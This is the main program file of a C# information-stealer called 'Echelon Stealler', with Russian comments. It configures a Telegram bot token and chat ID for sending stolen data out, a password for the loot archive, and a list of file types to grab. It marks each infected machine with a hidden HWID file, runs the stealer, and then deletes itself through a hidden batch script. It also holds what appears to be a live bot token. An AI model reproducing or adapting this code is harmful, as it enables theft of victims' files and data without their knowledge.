///////////////////////////////////////////////////////
////Echelon Stealler, C# Malware Systems by MadСod ////
///////////////////Telegram: @madcod///////////////////
///////////////////////////////////////////////////////


using Echelon.Properties;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;

namespace Echelon
{
    class Program
    {
        //Токен бота в телеге можно создать бота и получить токен тут: @BotFather
        public static string Token = "1230613231:AAHIU00xkjLD5gh2R3Dwt4ug4zoutlcng_U";

        // Telegram ID чата, можно узнать тут: @my_id_bot
        public static string ID = "844300569";

        // Пароль для архива с логом:
        public static string passwordzip = "Echelon";

        // максимальный вес файла в файлграббере 5500000 - 5 MB | 10500000 - 10 MB | 21000000 - 20 MB | 63000000 - 60 MB
        public static int FileSize = 10500000;

        // Список расширений для сбора файлов
        public static string[] Echelon_Size = new string[]
        {
          ".txt", ".rpd", ".suo", ".config", ".cs", ".csproj", ".tlp", ".sln",
        };

        [STAThread]
        private static void Main()
        {
            // Подключаем DotNetZip.dll, должен быть в ресурсах проекта и подключен как ссылка
            AppDomain.CurrentDomain.AssemblyResolve += AppDomain_AssemblyResolve;
            Assembly AppDomain_AssemblyResolve(object sender, ResolveEventArgs args)
            {
                if (args.Name.Contains("DotNetZip"))
                    return Assembly.Load(Resources.DotNetZip);
                return null;
            }


            if (File.Exists(Help.LocalData + "\\" + Help.HWID))
            {

                if (!File.ReadAllText(Help.LocalData + "\\" + Help.HWID).Contains(Help.HWID))
                {
                    // Запускаем стиллер
                    Stealer.GetStealer();
                }
                else
                {
                    Environment.Exit(0);
                }
            }

            else
            {
                Stealer.GetStealer();
                File.AppendAllText(Help.LocalData + "\\" + Help.HWID, Help.HWID);
                File.SetAttributes(Help.LocalData + "\\" + Help.HWID, FileAttributes.Hidden | FileAttributes.System);
            }

            // Самоудаление после отправки лога
            string batch = Path.GetTempFileName() + ".bat";
            using (StreamWriter sw = new StreamWriter(batch))
            {
                sw.WriteLine("@echo off");
                sw.WriteLine("timeout 4 > NUL"); // Задержка до выполнения следуюющих команд
                sw.WriteLine("DEL " + "\"" + Path.GetFileName(new FileInfo(new Uri(Assembly.GetExecutingAssembly().CodeBase).LocalPath).Name) + "\"" + " /f /q"); // Удаляем исходный билд
            }

            Process.Start(new ProcessStartInfo()
            {
                FileName = batch,
                CreateNoWindow = true,
                ErrorDialog = false,
                UseShellExecute = false,
                WindowStyle = ProcessWindowStyle.Hidden
            });
            Environment.Exit(0);

        }
    }
}
